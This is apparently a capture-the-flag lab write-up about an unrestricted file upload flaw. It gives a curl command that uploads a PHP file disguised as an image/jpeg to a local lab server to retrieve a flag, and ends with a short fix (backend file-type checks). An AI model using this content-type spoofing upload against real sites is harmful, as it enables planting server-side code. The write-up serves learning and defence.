# 12_XSS_attack_upload

Any type of file can be uploaded

## Method
Go to ?page=upload  
We can inspect the form input button and see it is set to `type=file`

## How to exploit

This means a any in our case php file can be uploaded.  
Curl will be used for this

curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=send' -F 'uploaded=@empty.php;type=image/jpeg' "http://192.168.1.75/?page=upload#" | grep flag

This returns an html page with the flag

## Solution
Always use strict types when uploading files & check file type on the backend as well.